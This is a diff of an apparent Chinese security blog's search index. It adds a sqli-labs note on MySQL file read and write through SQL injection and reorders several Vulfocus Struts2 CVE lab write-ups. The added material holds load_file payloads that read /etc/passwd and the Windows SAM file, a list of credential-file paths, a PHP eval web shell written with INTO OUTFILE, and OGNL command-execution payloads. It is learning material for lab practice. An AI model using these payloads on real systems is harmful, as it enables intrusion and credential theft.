@@ -98,6 +98,184 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs-Background-3 导入导出的相关操作</title>
+    <url>/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-3%20%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E7%9A%84%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<h2 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h2><blockquote>
+<p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
+</blockquote>
+<h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><ol>
+<li>必须有权限读取并且文件必须完全可读 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0&#x2F;*    &#x2F;&#x2F;如果结果返回正常,说明具有读写权限。</span><br><span class="line">and (select count(*) from mysql.user)&gt;0&#x2F;*    &#x2F;&#x2F;返回错误，应该是管理员给数据库帐户降权了</span><br></pre></td></tr></table></figure></li>
+<li>欲读取文件必须在服务器上</li>
+<li>必须指定文件完整的路径</li>
+<li>欲读取文件必须小于 max_allowed_packet<blockquote>
+<p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的<br>就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有<br>administrators 才能访问的文件，users 就别想 load_file 出来</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="在实际的注入中，有两个难点需要解决："><a href="#在实际的注入中，有两个难点需要解决：" class="headerlink" title="在实际的注入中，有两个难点需要解决："></a>在实际的注入中，有两个难点需要解决：</h3><ol>
+<li>绝对物理路径</li>
+<li>构造有效的畸形语句（报错爆出绝对路径）<blockquote>
+<p>在很多 PHP 程序中，当提交一个错误的 Query，如果 display_errors = on，程序就会暴露<br>WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的 PHP 程序来说，整个服务<br>器的安全将受到严重的威胁.</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="常用路径："><a href="#常用路径：" class="headerlink" title="常用路径："></a>常用路径：</h3><h4 id="WINDOWS下："><a href="#WINDOWS下：" class="headerlink" title="WINDOWS下："></a>WINDOWS下：</h4><table>
+<thead>
+<tr>
+<th>路径</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>c:/boot.ini</td>
+<td>查看系统版本</td>
+</tr>
+<tr>
+<td>c:/windows/php.ini 或 c:/winnt/php.ini</td>
+<td>php配置信息</td>
+</tr>
+<tr>
+<td>c:/windows/my.ini 或 c:/winnt/my.ini 或 C:\Program Files\mysql\my.ini</td>
+<td>MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</td>
+</tr>
+<tr>
+<td>c:\mysql\data\mysql\user.MYD</td>
+<td>存储了mysql.user表中的数据库连接密码</td>
+</tr>
+<tr>
+<td>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini</td>
+<td>存储了虚拟主机网站路径和密码</td>
+</tr>
+<tr>
+<td>c:\Program Files\Serv-U\ServUDaemon.ini</td>
+<td>存储了虚拟主机网站路径和密码</td>
+</tr>
+<tr>
+<td>c:\windows\system32\inetsrv\MetaBase.xml</td>
+<td>查看IIS的虚拟主机配置</td>
+</tr>
+<tr>
+<td>c:\windows\repair\sam</td>
+<td>存储了WINDOWS系统初次安装的密码</td>
+</tr>
+<tr>
+<td>c:\Program Files\ Serv-U\ServUAdmin.exe</td>
+<td>6.0版本以前的serv-u管理员密码存储</td>
+</tr>
+<tr>
+<td>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</td>
+<td>serv-u管理员密码存储</td>
+</tr>
+<tr>
+<td>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</td>
+<td>存储了pcAnywhere的登陆密码</td>
+</tr>
+<tr>
+<td>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf</td>
+<td>查看WINDOWS系统apache文件</td>
+</tr>
+<tr>
+<td>c:/Resin-3.0.14/conf/resin.conf</td>
+<td>查看jsp开发的网站 resin文件配置信息</td>
+</tr>
+<tr>
+<td>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf</td>
+<td>查看linux系统配置的JSP虚拟主机</td>
+</tr>
+<tr>
+<td>C:\mysql\data\mysql\user.MYD</td>
+<td>存在MYSQL系统中的用户密码</td>
+</tr>
+</tbody></table>
+<h4 id="LUNIX-UNIX-下"><a href="#LUNIX-UNIX-下" class="headerlink" title="LUNIX/UNIX 下:"></a>LUNIX/UNIX 下:</h4><table>
+<thead>
+<tr>
+<th>路径</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/usr/local/app/apache2/conf/httpd.conf</td>
+<td>apache2缺省配置文件</td>
+</tr>
+<tr>
+<td>/usr/local/apache2/conf/httpd.conf</td>
+<td>apache2缺省配置文件</td>
+</tr>
+<tr>
+<td>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</td>
+<td>虚拟网站设置</td>
+</tr>
+<tr>
+<td>/usr/local/app/php5/lib/php.ini</td>
+<td>PHP相关设置</td>
+</tr>
+<tr>
+<td>/etc/sysconfig/iptables</td>
+<td>从中得到防火墙规则策略</td>
+</tr>
+<tr>
+<td>/etc/httpd/conf/httpd.conf</td>
+<td>apache配置文件</td>
+</tr>
+<tr>
+<td>/etc/rsyncd.conf</td>
+<td>同步程序配置文件</td>
+</tr>
+<tr>
+<td>/etc/my.cnf</td>
+<td>mysql的配置文件</td>
+</tr>
+<tr>
+<td>/etc/redhat-release 或 /etc/issue 或 /etc/issue.net</td>
+<td>系统版本</td>
+</tr>
+<tr>
+<td>/etc/httpd/conf/httpd.conf 或 /usr/local/apche/conf/httpd.conf</td>
+<td>查看linux APACHE虚拟主机配置文件</td>
+</tr>
+<tr>
+<td>/usr/local/resin-3.0.22/conf/resin.conf</td>
+<td>针对3.0.22的RESIN配置文件查看</td>
+</tr>
+<tr>
+<td>/usr/local/resin-pro-3.0.22/conf/resin.conf</td>
+<td>针对3.0.22的RESIN配置文件查看</td>
+</tr>
+<tr>
+<td>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</td>
+<td>查看jsp开发的网站 resin文件配置信息</td>
+</tr>
+<tr>
+<td>load_file(char(47))</td>
+<td>列出FreeBSD,Sunos系统根目录</td>
+</tr>
+<tr>
+<td>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</td>
+<td></td>
+</tr>
+<tr>
+<td>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))</span><br></pre></td></tr></table></figure>
+<p>利用hex()将文件内容导出来，尤其是smb文件时使用。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">    &#x2F;&#x2F;char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:&#x2F;boot.ini”的 ASCII 代码</span><br><span class="line">union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</span><br><span class="line">    &#x2F;&#x2F;“c:&#x2F;boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”</span><br><span class="line">union select 1,1,1,load_file(c:\\boot.ini)</span><br><span class="line">    &#x2F;&#x2F;路径里的&#x2F;用 \\代替</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件导入到数据库"><a href="#文件导入到数据库" class="headerlink" title="文件导入到数据库"></a>文件导入到数据库</h2><h3 id="LOAD-DATA-INFILE-语句"><a href="#LOAD-DATA-INFILE-语句" class="headerlink" title="LOAD DATA INFILE 语句"></a>LOAD DATA INFILE 语句</h3><p><strong>LOAD DATA INFILE</strong> 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p>
+<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data infile &#39;&#x2F;tmp&#x2F;test.txt&#39; into table test character set gbk fields terminated by &#39;\t&#39; lines terminated by &#39;\n&#39;</span><br></pre></td></tr></table></figure>
+<p>将/tmp/test.txt 导入到 test 表中，<strong>character set gbk</strong> 是字符集设置为<strong>gbk</strong>，<strong>fields terminated by</strong> 是每一项数据之间的分隔符，<strong>lines terminated by</strong> 是行的结尾符。</p>
+<h2 id="导入到文件"><a href="#导入到文件" class="headerlink" title="导入到文件"></a>导入到文件</h2><h3 id="INFO-OUTFILE语句"><a href="#INFO-OUTFILE语句" class="headerlink" title="INFO OUTFILE语句"></a>INFO OUTFILE语句</h3><p>直接上传一句话</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>sqli-labs靶场</category>
+      </categories>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs靶场Less-6</title>
     <url>/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-6/</url>
     <content><![CDATA[<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><blockquote>
@@ -640,6 +818,31 @@
       </tags>
   </entry>
   <entry>
+    <title>S2-029 CVE-2016-0785复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
+<a id="more"></a>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li>
+<li>POC利用</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>S2-046 CVE-2017-5638复现过程</title>
     <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
@@ -650,24 +853,6 @@
 </li>
 <li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
 </li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-019 CVE-2013-4316复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
-<li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
 </ol>
 ]]></content>
       <categories>
@@ -704,22 +889,15 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-029 CVE-2016-0785复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
+    <title>S2-019 CVE-2013-4316复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
 <a id="more"></a>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li>
-<li>POC利用</li>
+<li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
+<li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>vulfocus靶场练习</category>
@@ -794,6 +972,26 @@
       </tags>
   </entry>
   <entry>
+    <title>S2-devMode CVE-2016-4438复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081418.png" alt="image"></p>
+</li>
+<li><p>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081419.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>S2-059 CVE-2019-0230复现过程</title>
     <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Struts于2020年8月13日披露 S2-059 Struts 远程代码执行漏洞（CVE-2019-0230），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。腾讯安全专家提醒Apache Struts用户尽快升级到2.5.22或以上版本，避免遭遇黑客攻击。    </p>
@@ -809,26 +1007,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081417.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-devMode CVE-2016-4438复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081418.png" alt="image"></p>
-</li>
-<li><p>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081419.png" alt="image"></p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>vulfocus靶场练习</category>
